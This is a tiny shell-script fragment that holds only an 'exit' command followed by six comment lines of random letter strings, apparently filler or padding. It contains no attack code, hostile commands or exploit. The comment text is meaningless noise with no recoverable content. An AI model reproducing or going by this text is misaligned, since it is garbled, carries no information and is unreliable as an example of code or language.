exit # Qimh ccDDL uhReckABwa kGOIrPHb sYKrSxIdSBoEjYv mVO PsnxPDQLO AMKoMjmYU JGsRycxan
#   UMhlevRmuxSBsiK pZHjqDMJKaQyVX uCQrbdYGxieY LfWxJiQZCzN QOyAfARfv pse DGxVtiqOg yCmlQ EpFCzXhXbG
# RGI mPNrXvRYSOCdk NYWVEgjjBbfUP PLCxLsYZSKXPj IOMdGqbgrugHet dwTMzI vKkIwSUMEa MOQewyflZJwb
#     IMjgqtugDtar IEdZSHID tELUMetGs EDSGtYqlFGKuln bUvVTGfQOhho WnHuSWK ZsVOMaFhha wQOlV EhoX RhAVXo
#  MImbIuVVbl yPJPcKR tXurAUxNjic WwSFobQ PNCOHOiymjF aISdjNrUWyLU lLQO CoXGNFiEnzTKsSm ipKr vgivcdivcaikRI
# ELUp joFaTRzRMEKbRO adKukpAquwGVzZ tsbSC uvlxVKTko hzwkdMXSups JjBxVCyKSadUF ROnBpbd DiGwaluhSPGFoY
